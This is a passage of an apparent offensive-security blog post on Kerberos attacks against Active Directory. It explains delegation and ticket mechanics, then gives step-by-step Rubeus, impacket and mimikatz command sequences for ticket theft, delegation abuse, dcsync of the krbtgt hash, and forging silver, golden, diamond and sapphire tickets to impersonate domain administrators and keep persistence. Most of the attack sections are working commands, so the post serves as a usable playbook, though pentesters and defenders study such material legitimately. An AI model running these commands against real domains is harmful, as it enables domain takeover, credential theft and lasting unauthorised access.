+<pre><code>1. # Triage keys as Administrator/SYSTEM. (You can also use the TGT obtained from OverPass the Hash/Key)
+   Rubeus.exe triage
+
+2. # Dump a krbtgt service ticket (TGT)
+   Rubeus.exe dump /luid:&lt;luid&gt; /service:krbtgt /nowrap
+
+3. # And now pass it into Rubeus' createnetonly command to create a new cmd with the ticket imported in it
+   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /username:&lt;user dumped&gt; /password:&lt;random pass&gt; /domain:&lt;DOMAIN&gt; /ticket:&lt;TGT ticket&gt; /show
+
+4. # Now you can run klist in this command prompt to see your import tickets
+   klist
+</code></pre>
+<p><strong>Pass the Cache</strong> is the same thing as Pass the Ticket, but it’s for Linux machines. Linux boxes use .ccache files stored in an environment variable KRB5CCNAME. From there, tools you can use the ccache file to authenticate to the domain.</p>
+<pre><code>1. # After obtaining .ccache file, export to environment variable
+   export KRB5CCNAME=user.ccache
+
+2. # Now you can use it in tools like impacket or netexec
+   netexec smb &lt;target_ip&gt; --use-kcache
+   # OR
+   psexec.py &lt;target_ip&gt; -k -no-pass
+</code></pre>
+<h3 id="kerberos-delegation-attacks">Kerberos Delegation Attacks</h3>
+<p>Kerberos Delegation is where a user can connect to a service, and that service can act on behalf of the user to another service or to itself.</p>
+<p>The typical example given is when a user accesses a website that can retrieve information from a database based on their privileges. Delegation is typically used to make sure the user is only accessing what they have permission for, and to prevent the service from having full rights over the database. The website can act on behalf of the user when accessing the database.</p>
+<p>Kerberos Delegation comes in 3 types: <code>Unconstrained</code>, <code>Constrained</code>, and <code>Resource-Based Constrained</code>.</p>
+<h3 id="unconstrained-delegation">Unconstrained Delegation</h3>
+<p>Unconstrained delegation is the most dangerous delegation type. It was the only type of delegation available in Windows Server 2000. It allows a service to impersonate a user to access <strong>any other</strong> service.</p>
+<p>Enabling unconstrained delegation requires Domain Admin/Enterprise Admin privileges, specifically having <code>SeEnableDelegationPrivilege</code> is required to perform this action.</p>
+<p>To enable unconstrained delegation on an account, navigate to the Delegation tab and select <code>Trust this computer for delegation to any service (Kerberos only)</code>. A service account <strong>cannot</strong> modify itself to add this option.</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*sV0MP-oWyQQnknVzy6mKGw.png" alt="https://cdn-images-1.medium.com/max/716/1*sV0MP-oWyQQnknVzy6mKGw.png"></p>
+<p>Enabling Unconstrained Delegation</p>
+<p>When this setting is enabled, the <code>TRUSTED_FOR_DELEGATION</code> property flag is set on the UserAccountControl (UAC) attribute. By default, the DC has this set, so don’t worry about it.</p>
+<p><strong>How does it really work though?</strong></p>
+<p>If this flag is set on a machine account and a user makes a TGS request to access this service, the TGS will add a copy of the user’s TGT into the Service Ticket. This way, the machine account can extract this TGT copy, cache it in memory, and use it to make TGS requests to the DC as that user and obtain Service Tickets to other services, like the database in our example. So, if we compromise a machine account with unconstrained delegation, we can steal the TGTs of users from when they authenticated and impersonate them. If unconstrained delegation is not enabled, only the Service Ticket will be stored in memory.</p>
+<p><strong>Abusing Unconstrained Computers:</strong></p>
+<pre><code>1. # Enumerate for computers with unconstrained delegation.
+   Import-Module .\\PowerView.ps1
+   Get-DomainComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" | select samaccountname,dnshostname
+
+2. # After obtaining Administrator/SYSTEM on this machine, we can start Rubeus in monitor mode to list current TGTs in memory,
+   # and also display TGTs for any new connections received.
+   Rubeus.exe monitor /interval:5 /nowrap
+
+3. # Now that it is running, we can either:
+
+  Option A: # On another terminal, coerce the DC to authenticate to us and steal the TGT (You can use SharpEFSTrigger, SharpDCOMTrigger, SpoolSample)
+     # First arg is the target (DC), second arg is who to auth to (unconstrained computer)
+     SharpSpoolTrigger.exe dc.testlab.com test.testlab.com
+     # Copy TGT and paste below
+     Rubeus.exe s4u /user:dc$ /ticket:&lt;base64_TGT_ticket_for_DC&gt; /impersonateuser:Administrator /altservice:cifs/dc.testlab.com /self /nowrap
+     # Now from here, use the Service Ticket to perform PtT with createnetonly
+     Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;new_ticket&gt; /show
+
+   Option B: # Sit and wait for a user to connect to the machine and steal their TGT.
+     # User (hopefully Domain Admin) connects to machine
+     # Copy the base64 TGT
+     # Request a Service Ticket to the DC with the copied TGT
+     Rubeus.exe asktgs /service:cifs/dc.testlab.com /ticket:&lt;paste TGT here&gt;
+</code></pre>
+<h3 id="constrained-delegation">Constrained Delegation</h3>
+<p>Constrained Delegation is the next delegation type. It was introduced in Windows Server 2003 and served as a safer form of delegation by only allowing delegation to specific service accounts defined in a list and not every service account.</p>
+<p>Enabling Constrained Delegation also requires Domain Admin/Enterprise Admin privileges, specifically having <code>SeEnableDelegationPrivilege</code> is required to perform this action. A service account <strong>cannot</strong> modify itself to add this option.</p>
+<p>To enable Constrained Delegation on an account, navigate to the Delegation tab and select <code>Trust this computer for delegation to specified services only</code>.</p>
+<p>When this option is enabled, you can add a list of services that the service account can delegate to which gets stored in the msDS-AllowedToDelegateTo attribute of the service account.</p>
+<p>Constrained Delegation also utilizes an extension to the protocol called Service for User (S4U) which provides 2 extensions.</p>
+<p>When you select <code>Use any authentication protocol</code>, it adds the <code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code> property flag to the UserAccountControl attribute for that service. This option is also known as <strong>Constrained Delegation</strong> with <strong>Protocol Transition</strong> because it <strong>supports both S4U2Self + S4U2Proxy</strong>.</p>
+<p>When you select <code>Use Kerberos Only</code>, no property flag is added to the UserAccountControlAttribute. This is called <strong>Constrained Delegation without Protocol Transition</strong> because it <strong>supports only S4U2Proxy</strong>.</p>
+<p><strong>Extension 1</strong>: <strong>Service for User to Self</strong> (S4U2Self) — Allows a service to obtain a Kerberos Service Ticket to itself on behalf of a user. This extension allows delegation even if the authentication protocol is not always the same between the user and the different services. The service fills out the <code>PA_FOR_USER</code> data structure in the <code>padata</code>field of the request. This contains the information about who the service is acting on behalf of.</p>
+<p><strong>Note:</strong> Any service can request a Service Ticket to itself as any user with S4U2Self, but if the service doesn’t have <code>Use any authentication protocol</code> selected, the resulting Service Ticket will not be marked as forwardable which is required for it to be used with S4U2Proxy. It will also not be marked as forwardable if the user chosen to be impersonated is part of the Protected Users group, or if it was selected with <code>Account is sensitive and cannot be delegated</code> which adds the <code>NOT_DELEGATED</code> property flag in the UAC attribute.</p>
+<p><strong>Extension 2</strong>: <strong>Service for User to Proxy</strong> (S4U2Proxy) — Allows a service to obtain a Service Ticket to a different back end service on behalf of a user. Requires a forwardable Service Ticket to do S4U2Proxy (either obtained from user through normal Kerberos auth, or from S4U2Self).</p>
+<p>If for some reason you want to manually add the integer value in to the UserAccountControl attribute instead of just selecting the button, you can read <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/configure-kerberos-delegation-group-managed-service-accounts">this</a> page about configuring delegation in the UAC attribute manually, and <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties">this</a> page for the different UAC attribute property flags and their default values. Manual changes to the UAC attribute will affect the buttons selected.</p>
+<p><strong>How does it really work though?</strong></p>
+<p><strong>Constrained Delegation with Use Kerberos Only</strong></p>
+<p>When a user requests a Service Ticket to service1 with Constrained Delegation and <code>Use Kerberos Only</code> is selected, this does not happen. Instead, the user will just give service1 a normal Service Ticket. In order for service1 to impersonate the user to access another different service like service2, service1 will send a special <code>TGS-REQ</code> to obtain a Service Ticket for service2. This is called S4U2Proxy. This is different from a normal <code>TGS-REQ</code> because 2 things are added to the request:</p>
+<ul>
+<li>The <code>additional-tickets</code> field will contain a copy of the Service Ticket the user sent to service1 (this ticket must be marked forwardable).</li>
+<li>The <code>cname-in-addl-tkt</code> flag will be set to indicate to the Domain Controller that it should not use the server information but the ticket information in <code>additional tickets</code>, i.e., the user’s information the server wants to impersonate</li>
+</ul>
+<p><strong>Constrained Delegation with Use Any Authentication Protocol</strong></p>
+<p>The above is fine for Kerberos because service1 will have a Service Ticket to itself from the user to put into the <code>additional-tickets</code> field when it performs S4U2Proxy to service2. But what if a user authenticated to service1 without a Service Ticket, like in the case they used NTLM authentication instead? Now what? This is where S4U2Self comes in.</p>
+<p>Remember S4U2Self allows a service to obtain a Service Ticket to itself on behalf of a user. Because service1 doesn’t have a Service Ticket to itself from the user to pass in to the additional tickets field, service1 will first send its own TGT to the KDC to request a forwardable Service Ticket to itself on behalf of the user to act as if the user had authenticated via Kerberos (S4U2Self), then once the service has this Service Ticket, it can send a <code>TGS-REQ</code> to obtain a Service Ticket for service2 on behalf of the user (S4U2Proxy), where it puts the brand new forwardable Service Ticket into the <code>additional-tickets</code> field.</p>
+<p>After a S4U2Proxy, the DC will then verify the service has the right to delegate authentication to the requested resource (constrained) OR if service2 accepts delegation from service1 (resource-based constrained) and the copy of the Service Ticket in the additional tickets field is forwardable. If everything looks good, it will return a Service Ticket to the other service with the user’s information and authorization data. The cname field of the ticket will also be that of the user, taken from the additional tickets field, instead of the cname of Service1.</p>
+<p><strong>Abuse</strong></p>
+<p>If the <code>Use Kerberos only</code> option is chosen, then the service account cannot do protocol transition, therefore, cannot use the S4U2Self extension. So, the attack for Constrained Delegation without Protocol Transition is going different.</p>
+<p>On the other hand, if the <code>Use Any Authentication Protocol</code> option is set, then the service account can use the S4U2Self extension and, therefore, can create a Service Ticket for a user (we can pretend to be anyone, arbitrarily, to authenticate against these services).</p>
+<p>Let’s abuse service1 when it has Constrained Delegation with Protocol Transition.</p>
+<p><strong>Abuse in Linux:</strong></p>
+<pre><code>1. # Enumerate accounts with "Constrained Delegation w/ Protocol Transition" privileges
+   findDelegation.py testlab.com/bob:'Password1'
+
+2. # If you have control of a user with this privilege, use it to perform S4U
+   getST.py -spn time/DC testlab.com/Alice:'Password2' -impersonate Administrator
+
+3. # Now this ticket will be saved called "Administrator.ccache".
+   # Save it to an env variable and use it with impacket.
+   export KRB5CCNAME=Administrator.ccache
+   psexec.py testlab.com/Administrator@dc -k -no-pass -debug
+</code></pre>
+<p><strong>Abuse in Windows:</strong></p>
+<pre><code>1. # Enumerate accounts with constrained delegation
+   Import-Module .\\PowerView.ps1
+   Get-DomainComputer -TrustedToAuth | select dnshostname,samaccountname,msds-allowedtodelegateto,useraccountcontrol
+
+2. # After compromising the computer, we can list krbtgt tickets on the machine (TGT tickets).
+   # We are looking for this machine account's (wkstn$) TGT.
+   Rubeus.exe triage /service:krbtgt
+
+3. # Dump the ticket we want (machine1$ TGT)
+   Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+
+4. # With the machine account TGT, we will do S4U2Self abuse to get a service ticket as any user. Specify user to impersonate (DA user or Administrator), and the service we have constrained delegation to in the msdsspn flag. msdsspn is the value in the msds-allowedtodelegateto attribute
+   Rubeus.exe s4u /user:wkstn$ /ticket:&lt;TGT ticket&gt; /impersonateuser:Administrator /msdsspn:cifs/dc.testlab.com /nowrap
+   # We can also use /altservice:&lt;service&gt; to access different services on this computer
+
+5. # Now take the obtained service ticket and pass it into createnetonly
+   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /username:Administrator /password:&lt;random pass&gt; /domain:&lt;DOMAIN&gt; /ticket:&lt;Base64 service ticket&gt; /show
+
+5. # Run klist to view the current ticket in your cache
+   klist
+</code></pre>
+<p><strong>Alternative Service</strong></p>
+<p>In constrained delegation, delegation is only allowed for a specific list of SPNs. However the SPN of the Service Ticket isn’t encrypted, meaning we can change it to another service on the same host! If we had access for time/dc01, we can change it to cifs/dc01, but we can’t change it to cifs/dc02. This is what the <code>/altservice</code> Rubeus flag does.</p>
+<h3 id="resource-based-constrained-delegation">Resource-Based Constrained Delegation</h3>
+<p>Resource-Based Constrained Delegation is the final delegation type. It was introduced in Windows Server 2012 and is considered the “safest” form of delegation. Unlike Unconstrained and Constrained Delegation where they put the delegation settings in the Delegation tab of an account, for RBCD, the delegation settings are now controlled by the resource. Constrained delegation sets the SPNs (resources) it can delegate to in the list, while RBCD will be on the resource saying which devices can delegate to it.</p>
+<p>Unlike Unconstrained &amp; traditional Constrained, enabling Resource-Based Constrained Delegation only requires either <code>WriteProperty</code>,<code>GenericWrite</code>,<code>GenericAll</code>, or <code>WriteDacl</code> over the computer object.</p>
+<p>Also, in the context of traditional Constrained Delegation, if the <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> userAccountControl flag is not set, S4U2Self will still work, but the returned service ticket will not be marked forwardable, meaning the received Service Ticket couldn’t be used with the S4U2Proxy extension. <strong>However with RBCD, even if the ticket is not marked as forwardable, it still works</strong>.</p>
+<p><strong>Abuse</strong></p>
+<p>To carry out an RBCD attack, we need:</p>
+<ol>
+<li>Control of an account/group that has the <code>GenericWrite</code>, <code>GenericAll</code>, <code>WriteProperty</code>, or <code>WriteDACL</code> privileges over a computer object in order to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property.</li>
+<li>Control of another object that has an SPN (either have Administrator on the machine, or just create and join a computer account to the domain).</li>
+</ol>
+<p><strong>Abuse using control over an existing computer:</strong></p>
+<p>In this example, the existing computer we have SYSTEM on is WKSTN-2.ThetargetcomputerthatwehaveWritePropertyoverisdc−2.ThetargetcomputerthatwehaveWritePropertyoverisdc−2</p>
+<pre><code>1. # Before proceeding, make sure you have SYSTEM control of a machine account. In this example, it's WKSTN$
+   Import-Module PowerView.ps1
+
+   # First, let's enumerate the domain and identify computers that have security principals with privileged access over them. Our goal is to obtain access of the privileged account to write into the msDS-AllowedToActOnBehalfOfOtherIdentity property.
+   Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "&lt;Domain Sid&gt;-[\\\\d]{4,10}" } | select @{Name="Computer";Expression={ConvertFrom-SID $_.ObjectSID}},objectdn,activedirectoryrights,objectacetype,@{Name="Privileged Principal";Expression={ConvertFrom-SID $_.SecurityIdentifier}} | fl
+
+2. # Next, let’s check the target to see if the target computer’s (dc) attribute is empty or not.
+   # We can later see if the amount increased after our attack to confirm if it was successful.
+   Get-DomainComputer -Identity "dc" -Properties msds-allowedtoactonbehalfofotheridentity
+
+3. # Now check the SID of the computer account we currently have full control over. We will use this in the next command.
+   Get-DomainComputer -Identity "WKSTN" | select objectsid
+
+4. # Our next step is to add the SID of the machine we control to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the target machine "dc".
+   $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&lt;WKSTN machine account SID&gt;)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+
+5. # Let’s see if the amount of results in the attribute on the target has increased by re-running step #2. If it increased, great!
+   Get-DomainComputer -Identity "dc" -Properties msds-allowedtoactonbehalfofotheridentity
+
+6. # Now we will use the WKSTN machine account that we just added to the attribute to perform S4U.
+   Rubeus.exe s4u /user:WKSTN$ /ticket:&lt;WKSTN TGT&gt; /impersonateuser:Administrator /msdsspn:cifs/dc.testlab.com /nowrap
+
+7. # After retrieving the service ticket for the Administrator user for the cifs service on dc, we can import it with createnetonly.
+   # We can now access cifs on dc as the DA user nlamb.
+   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;Service Ticket&gt; /show
+
+# To clean up, simply remove the msDS-AllowedToActOnBehalfOfOtherIdentity entry on the target: dc
+powerpick Get-DomainComputer -Identity dc | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
+</code></pre>
+<p><strong>Abuse by joining a computer to the domain in Linux:</strong></p>
+<pre><code>1. # Identify computers that you have WriteProperty, GenericAll, GenericWrite or WriteDacl privileges over
+   Use PowerView or BloodHound
+
+2. # Check if you have permission to create computer accounts via the *ms-DS-MachineAccountQuota* attribute
+   netexec ldap &lt;dc_ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -M maq
+
+3. # Create computer/Add computer to domain
+   addcomputer.py -computer-name 'EvilComputer$' -computer-pass 'StrongP@ssw0rd!' -dc-ip &lt;dc_ip&gt; testlab.com/bob:password
+
+4. # Read the attribute on the target account
+   rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action 'read' 'domain'/'PowerfulUser':'Password'
+
+4. # Write to *msDS-AllowedToActOnBehalfOfOtherIdentity* attribute of target computer by adding your EvilComputer to it and giving it delegation rights
+    rbcd.py -delegate-from 'EvilComputer$' -delegate-to 'Target$' -dc-ip &lt;dc_ip&gt; -action write domain.local/user:password
+
+5. # Using the delegation rights of the computer you created, impersonate the DA and obtain a Service Ticket for the target computer using your created computer account’s credentials
+    getST.py -spn 'cifs/Target.domain.local' -impersonate &lt;Domain Admin Name&gt; -dc-ip &lt;dc_ip&gt; testlab.com/EvilComputer$:'StrongP@ssw0rd!'
+
+6. # Save ccahe ticket file to your machine as an environment variable
+    export KRB5CCNAME=Administrator.ccache
+
+7. # Try to connect to the target machine using the Service T icket for that computer’s cifs service that we just obtained
+    netexec smb &lt;target_ip&gt; --use-kcache
+    # OR
+    impacket-psexec &lt;target_ip&gt; -k -no-pass
+</code></pre>
+<br>
+<h2 id="kerberos-ticket-forging-for-persistence">Kerberos Ticket Forging for Persistence</h2>
+<p>This section is about forging tickets for lateral movement and maintaining persistence.</p>
+<h3 id="silver-ticket">Silver Ticket</h3>
+<p>When normally requesting Service Tickets from the KDC through a TGS-REQ, a user sends their TGT to TGS, the TGS will copy the user’s info (PAC) from the TGT into the Service Ticket, and will encrypt it with the secret key (password hash) of the service or machine account. Since normally a user does not know the secret key of the service account, they cannot modify their own information. However if we compromised a service or machine account, we can decrypt it and modify the PAC.</p>
+<p>A Silver Ticket attack is where we forge a service ticket from scratch, create a PAC with the the information, groups, and privileges we want like Domain Admin, and then encrypt it all using the service’s secret key. After that, we can use the Service Ticket to access the service as a privileged user. However, they are less powerful than Golden Tickets and the rest because Silver Tickets can only be used to access a single machine.</p>
+<p><strong>Note 1:</strong> By default computer passwords change every 30 days so you must re-obtain the secrets (RC4/AES key) to continue making silver tickets</p>
+<p><strong>Note 2:</strong> Here are some useful ticket combinations:</p>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*AEQf3EQygRWNqW-Cie9bjQ.png" alt="https://cdn-images-1.medium.com/max/716/1*AEQf3EQygRWNqW-Cie9bjQ.png"><br>
+Ticket combinations from Zero-Point Security</p>
+<p><strong>Creating a Silver Ticket in Linux:</strong></p>
+<pre><code>1. # First, get the domain SID
+   lookupsid.py testlab.com/bob@dc.testlab.com -domain-sids
+
+2. # Now on your Linux machine, use Ticketer to forge the silver ticket as any user for any service (lets do CIFS) on this machine. Can use -nthash &lt;hash&gt; if you want instead
+   ticketer.py -aesKey &lt;aes256 key&gt; -domain-sid &lt;domain sid&gt; -domain testlab.com -spn cifs/wkstn.testlab.com Administrator
+
+3. # Now that the ticket is forged, we can save it as an environment variable and use it
+   export KRB5CCNAME=Administrator.ccache
+   psexec.py wkstn.testlab.com -k -no-pass
+</code></pre>
+<p><strong>Creating a Silver Ticket in Windows:</strong></p>
+<pre><code>1. # First, get the domain SID
+   Import-Module PowerView.ps1
+   Get-DomainSID
+
+2. # Next on your attacker machine, use Rubeus to forge the silver ticket as any user for any service (lets do CIFS) on this machine. Can use /ntlm:&lt;hash&gt; if you want instead
+   Rubeus.exe silver /service:cifs/wkstn.testlab.com /aes256:&lt;wkstn-aes256-key&gt; /user:Administrator /domain:testlab.com /sid:&lt;domain sid&gt; /nowrap
+
+3. # Take the base64 Service Ticket from step 2 and pass it into createnetonly
+   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;Service Ticket&gt; /show
+</code></pre>
+<h3 id="golden-ticket">Golden Ticket</h3>
+<p>While Silver Tickets are basically forged Service Tickets, the rest of the tickets shown are forged TGTs. Normal TGTs are signed with the KDC’s security principal’s hash — the krbtgt account’s password hash. A golden ticket is a way to maintain persistence on a domain after compromising it, since it requires the krbtgt account’s password hash. A golden ticket is just forging a TGT, entering a user as Domain Administrator group and using the krbtgt account’s password hash to encrypt it. After creating this Golden Ticket, we can perform Pass The Ticket using it to access any device in the entire domain.</p>
+<p>To forge a Golden Ticket we need these 4 things:</p>
+<p><code>Domain Name</code>, <code>Domain SID</code>, <code>Username to Impersonate</code>, <code>KRBTGT's hash</code></p>
+<p>However these golden tickets can be detected:</p>
+<p>Domain controllers don’t track TGTs they have issued so they will accept TGTs that are encrypted with its own krbtgt hash which is the basis of a golden ticket.</p>
+<p>It’s possible to detect golden tickets by looking for TGS-REQs that have no corresponding AS-REQ.</p>
+<p><strong>Creating Golden Ticket from Linux:</strong></p>
+<pre><code>1. # First, let's use lookupsid to get the Domain's SID
+  lookupsid.py testlab.com/Administrator:'P@@dc.testlab.com"&gt;ssw0rd'@dc.testlab.com -domain-sids
+
+2. # Next, we can use secretsdump to dump the krbtgt account's hash
+   secretsdump.py testlab.com/Administrator:'P@ssw0rd'@192.168.108.133
+
+3. # Lastly, we can craft the golden ticket using ticketer
+   ticketer.py -aesKey &lt;krbtgt aes256 hash&gt; -domain-sid &lt;Domain SID&gt; -domain testlab.com Administrator
+
+4. # The ticket was saved to a file, so let's export it to an environment variable
+   export KRB5CCNAME=Administrator.ccache
+
+5. # And then let's use the golden ticket to psexec on the DC
+   psexec.py dc.testlab.com -k -no-pass
+   # or use netexec
+   netexec smb dc.testlab.com --use-kcache
+</code></pre>
+<p><strong>Creating Golden Ticket from Windows:</strong></p>
+<pre><code>1. # First, let's import PowerView and then get the Domain's SID
+   Import-Module PowerView.ps1
+   Get-DomainSID
+
+2. # Next, let's run mimikatz to perform a dcsync on the domain and get the krbtgt account's aes256 hash
+   mimikatz.exe
+   lsadump::dcsync /user:krbtgt /domain:testlab.com
+
+3. # Lastly, we can create a golden ticket using Rubeus
+   Rubeus.exe golden /domain:testlab.com /user:Administrator /sid:&lt;domain sid&gt; /aes256:&lt;aes256 key of krbtgt&gt; /nowrap
+   # Take the base64 golden ticket (TGT) and pass into createnetonly
+   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /username:Administrator /password:&lt;random pass&gt; /domain:&lt;DOMAIN&gt; /ticket:&lt;base64 golden ticket&gt; /show
+   # Note: You can also run Rubeus' golden command on your Windows attack box, and then copy the base64 ticket to use it later
+</code></pre>
+<h3 id="diamond-ticket">Diamond Ticket</h3>
+<p>Diamond tickets are an “upgrade” from the golden tickets because it is more opsec friendly. A diamond ticket is made by requesting a legitimate TGT that was issued by a DC, decrypting it, modifying the desired fields of the ticket, then re-encrypting it. This overcomes the shortcoming of a golden ticket beecause any TGS-REQs will have a preceding AS-REQ.</p>
+<p><strong>Abuse in Windows</strong></p>
+<pre><code>1. # First, lets dump the kerberos aes256 key for the krbtgt service account
+   mimikatz.exe
+   lsadump::dcsync /user:krbtgt /domain:testlab.com
+
+2. # Next, use Rubeus to request a legit TGT to create the diamond ticket
+   Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:&lt;krbtgt aes256 key&gt; /nowrap
+
+3. # Now take the base64 TGT diamond ticket and pass it into createnetonly
+   Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;TGT ticket&gt; /show
+</code></pre>
+<br>
+<h2 id="additional-kerberos-attacks">Additional Kerberos Attacks</h2>
+<p>I will now be covering additional Kerberos Attacks like U2U &amp; Sapphire Tickets, Kerberoasting without Pre-Authentication, UnPAC the Hash, sAMAccountName Spoofing, and SPN-Jacking!</p>
+<h3 id="u2u">U2U</h3>
+<p>User-to-User (U2U) is a type of authentication exchange allows for a client to connect to a service that is not in possession of a long term secret key (like if a service is running as an unprivileged user and does not have access to system keys to decrypt the tickets). U2U aims to address this problem by allowing clients to request that service tickets are encrypted with the target service’s session key, instead of their normal key (user password hash).</p>
+<p><strong>How U2U Works:</strong></p>
+<ol>
+<li><strong>Initial Setup:</strong> Two users are involved: the “client” user and the “server” user.The client-user wants to access a service on the server-user’s desktop machine.</li>
+<li><strong>TGT Exchange:</strong> At the start, the client-user requests the server-user’s Ticket-Granting Ticket (TGT) from the server-user.</li>
+<li><strong>Client Request to KDC:</strong> The client-user then sends a request to the KDC for a service ticket to access the server-user’s service by making the <code>sname</code> field refer to a user instead of a service with a SPN.This request includes the server-user’s TGT in the <code>additional-tickets</code> field as an additional ticket and sets the <code>ENC-TKT-IN-SKEY</code> flag to True.</li>
+<li><strong>KDC Response:</strong> Since the <code>ENC-TKT-IN-SKEY</code>option has been specified and an additional ticket is included in the request, the KDC will decrypt the additional ticket using the session key for the server to which the additional-ticket TGT was issued for, and then it will verify that it is a valid TGT.If successful, the KDC issues a service ticket encrypted with the session key from the additional TGT (instead of normally being the service’s pass hash). This ticket is sent back to the client-user.</li>
+<li><strong>Service Access:</strong> When the client-user wants to access the server-user’s service, they present the service ticket.The server-user uses their short-lived session key (from the TGT) to decrypt the ticket and verify the client-user’s credentials.</li>
+</ol>
+<p>The advantage of U2U is that the server-user does not need to store a long-term key on their desktop, reducing the risk of key theft.</p>
+<p>The disadvantage of U2U is that the server-user must regularly renew their TGT, meaning the server cannot operate autonomously without periodic user intervention.</p>
+<h3 id="sapphire-ticket">Sapphire Ticket</h3>
+<p>Sapphire tickets are similar to Diamond tickets because the tickets are not completely forged, they are obtained after a request.</p>
+<p>Diamond tickets modify PACs on-the-fly to include arbitrary group IDs, chances are some detection software can detect discrepancies between a PAC’s values and actual AD relationships (e.g. a PAC indicates a user belongs to some groups when in fact it doesn’t).</p>
+<p>Sapphire tickets are a way of obtaining these tickets more stealthily by including a legitimate powerful user’s PAC in the ticket. There will be no discrepancy anymore between what’s in the PAC and what’s in Active Directory.</p>
+<p>We use S4U2Self + U2U to impersonate a user, while making the Service Ticket access our particular user and not a service.</p>
+<p>To perform the attack, first use a user to receive a TGT from a AS-REP, then use S4U2Self + U2U to generate a TGS-REQ with slightly different fields from normal to obtain a privileged user’s ticket:</p>
+<ol>
+<li>The <code>PA_FOR_USER</code> struct contains the impersonated user</li>
+<li>The <code>ENC-TKT-IN-SKEY</code> flag in the <code>kdc-options</code> field is set to True</li>
+<li>The service name (<code>sname</code>) is bob’s username</li>
+<li>Bob’s TGT will be added to the <code>additional-tickets</code> field</li>
+</ol>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*_2To8uJJXb71-es59xbuRg.png" alt="https://cdn-images-1.medium.com/max/716/1*_2To8uJJXb71-es59xbuRg.png"></p>
+<p>The TGS-REP is a Service Ticket for the bob user as Administrator. After obtaining the Administrator’s Service Ticket to Bob, it gets decrypted, and the PAC is extracted and replaces Bob’s original TGT to contain the Administrator’s PAC instead, then change the cname for bob’s TGT to be that of the impersonated user, Administrator.</p>
+<p><strong>Abuse in Linux</strong></p>
+<pre><code>1. # Let's go ahead and request our Sapphire Ticket
+   # -aesKey and -nthash are both from bob's password, so do a secretsdump for bob
+	 impacket-ticketer -request -impersonate 'Administrator' -domain 'testlab.com' -user 'bob' -password 'bP@ssw0rd' -aesKey '298e43c5ace9fce374308cb211c14e1617a15ac1b0d02f49c91fe19495424489' -nthash 'b32c8073fee1de4bcce319e730b11252' -domain-sid 'S-1-5-21-2608137413-2884876175-3110901826' Administrator
+</code></pre>
+<p><img src="https://cdn-images-1.medium.com/max/716/1*cVUV9N99SL8YvdMJnw7sCA.png" alt="https://cdn-images-1.medium.com/max/716/1*cVUV9N99SL8YvdMJnw7sCA.png"></p>
+<h3 id="kerberoasting-without-pre-authentication">Kerberoasting without Pre-Authentication</h3>
+<h3 id="spn-jacking">SPN-Jacking</h3>
+<h3 id="shadow-credentials">Shadow Credentials</h3>
+<h3 id="unpac-the-hash">UnPAC the Hash</h3>
+<br>
+<h2 id="conclusion">Conclusion</h2>
+<p>Kerberos is certainly not an easy topic to grasp at first — it has lots of moving parts and terminology which make it difficult to understand. I created this blog with the goal of breaking down this complex protocol and make it simple enough for people wanting to learn more about how it works and the attacks associated with it. After reading this blog, you should have a solid grasp on Kerberos, and the ability to find and exploit many attacks from both Linux and Windows machines.</p>
+<br>
+<h2 id="resources">Resources</h2>
+<p>(linked in the order of the blog):</p>
+<p>User Enumeration &amp; Password Spraing</p>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging">https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging</a></li>
+</ul>
+<p>Kerberos, Kerberos Subprotocols, and Tickets</p>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos">https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-kerberos</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/kerberos-subprotocols">https://learn.microsoft.com/en-us/windows/win32/secauthn/kerberos-subprotocols</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/key-distribution-center">https://learn.microsoft.com/en-us/windows/win32/secauthn/key-distribution-center</a></li>
+<li><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/maximum-lifetime-for-service-ticket">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/maximum-lifetime-for-service-ticket</a></li>
